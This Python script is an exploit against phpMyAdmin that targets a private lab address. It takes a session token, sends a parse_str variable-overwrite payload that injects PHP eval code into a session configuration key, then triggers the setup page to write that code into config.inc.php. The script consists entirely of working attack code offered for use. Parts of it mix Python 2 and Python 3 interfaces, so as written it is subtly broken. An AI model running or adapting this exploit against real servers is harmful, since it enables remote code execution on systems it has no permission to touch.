# encoding: utf-8

import re
from urllib  import request

target = 'http://10.10.10.108/phpMyAdmin/'

def main():
    ################################################################
    print('Step1: request first page and get phpMyAdmin & token:')
    obj = request.urlopen(target+'index.php')
    headers = obj.headers.headers
    token = re.findall("token=(\w{32})",obj.read())[0]
    for x in headers:
        tmp = re.findall("phpMyAdmin=(\w{32,40});",x)
        if tmp:
            sessionid = tmp[0]
    print(token,sessionid)
    ################################################################
    print('Step2: send payload to swekey.auth.lib.php for using parse_str() to cover variables')
    payload =  "?session_to_unset=123&_SESSION[ConfigFile][Servers][*/eval('echo phpinfo();');/*][host]=Hacking&token=%s"%token
    opener = request.build_opener()
    opener.addheaders.append( ('Cookie',"pma_lang=en; pma_mcrypt_iv=HXvXFtE5OYc=; security_level=0; phpMyAdmin=%s"%sessionid) )
    request.install_opener(opener)
    try:
        request.urlopen(target+'db_create.php'+payload)
    except Exception as e:
        print('Exception: %s'%e)
    ################################################################
    print('Step3: visit setup/config.php to omit save file to config/config.inc.php')
    print('Now save data to config file...')
    postdata = "tab_hash=&check_page_refresh=&phpMyAdmin=%s&eol=unix&DefaultLang=en&ServerDefault=0&submit_save=Save&phpMyAdmin=%s"%(sessionid,sessionid)
    obj = request.urlopen(target+'setup/config.php',data=postdata)
    print('request status: %d'%obj.getcode())
    ################################################################
    print('Step4: visit config/config.inc.php to verify the result')


if __name__ == '__main__':
    main()